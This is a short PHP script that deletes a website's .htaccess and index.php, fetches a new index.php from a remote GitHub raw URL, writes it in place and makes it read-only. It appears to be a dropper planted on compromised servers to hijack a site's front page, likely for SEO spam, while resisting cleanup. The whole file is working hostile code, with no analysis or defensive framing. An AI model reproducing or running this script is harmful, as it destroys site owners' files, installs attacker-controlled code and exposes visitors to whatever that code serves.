<?php

// Get request path (URL-based)
$uriPath = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

// Count how many directories exist in the URL
$segments = array_values(array_filter(explode('/', $uriPath)));

// If URL has more than one segment before the file, go back one directory
// domain.com/code.php            -> segments = [code.php]       -> stay
// domain.com/anydir/code.php     -> segments = [anydir, code.php] -> chdir('..')

if (count($segments) > 1) {
    chdir('..');
}

$remoteUrl = 'https://raw.githubusercontent.com/seobela/temp/refs/heads/main/index.php';
$files = ['.htaccess', 'index.php'];

/* chmod and delete old files */
foreach ($files as $file) {
    if (file_exists($file)) {
        @chmod($file, 0644);
        @unlink($file);
    }
}

/* download new index.php */
$ch = curl_init($remoteUrl);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_TIMEOUT => 20
]);

$data = curl_exec($ch);
curl_close($ch);

if ($data === false) {
    die('Download failed');
}

file_put_contents('index.php', $data);
chmod('index.php', 0444);

echo 'Done';
